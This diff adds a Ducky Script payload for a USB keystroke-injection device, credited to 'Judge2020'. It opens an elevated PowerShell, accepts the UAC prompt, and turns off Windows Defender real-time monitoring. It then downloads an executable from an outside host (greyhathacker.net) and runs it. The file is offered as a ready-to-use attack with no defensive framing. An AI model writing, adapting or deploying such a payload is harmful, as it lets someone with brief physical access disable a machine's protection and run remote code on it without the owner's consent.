@@ -1,0 +1,34 @@
+REM Windows 10: Disable Windows Defender with Powershell
+REM Author: Judge2020
+REM author website: Judge2020.com
+REM video: https://youtu.be/XQyB_bKjbgU
+REM  
+REM let the HID enumerate
+DELAY 2000
+GUI r
+DELAY 300
+REM my best attempt at a elevated powershell instance
+STRING powershell Start-Process powershell -Verb runAs
+ENTER
+DELAY 2600
+ALT y
+DELAY 500
+REM turn off 
+STRING Set-MpPreference -DisableRealtimeMonitoring $true
+ENTER
+REM  
+REM  
+REM  
+REM config
+REM  
+REM  
+REM  
+STRING $url = 'http://www.greyhathacker.net/tools/messbox.exe';
+ENTER
+STRING $file = 'mess1.exe';
+ENTER
+REM  
+REM  end config
+REM  
+STRING $down = New-Object System.Net.WebClient; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file); exit;
+ENTER
